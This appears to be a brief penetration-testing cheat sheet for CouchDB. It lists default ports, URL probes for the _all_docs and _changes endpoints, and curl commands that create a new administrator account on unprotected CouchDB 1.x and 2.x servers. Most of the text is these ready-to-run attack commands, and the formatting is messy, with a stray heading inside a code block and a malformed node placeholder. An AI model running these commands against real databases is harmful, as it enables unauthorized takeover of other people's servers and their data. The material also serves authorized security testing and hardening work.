## Fundamentals

https://justi.cz/security/2017/11/14/couchdb-rce-npm.html

### Default Open Ports
```
5984
6984
## Can you use 80 or 443
```

## Testing for couchDB
```bash
http://test.site/search.php?submit=Submit&search=_all_docs
or 
http://test.site/search.php?submit=Submit&search=_changes
```

### Adding new admin through unprotected CouchDB 1.x
```url
curl -s -X PUT http://test.site:5984/_config/admins/rob -d '"123456"'
```

### Adding new admin through unprotected CouchDB 2.x
```url
curl -s -X PUT http://test.site:5984/_node/<NODENAME/_config/admins/root -d '"123456"'
# The defailt node is "nonode@nohost", try "couchdb@localhost" as a node as well.
# All available nodes can be found through curl -X GET http://test.site:5984/_membership
```
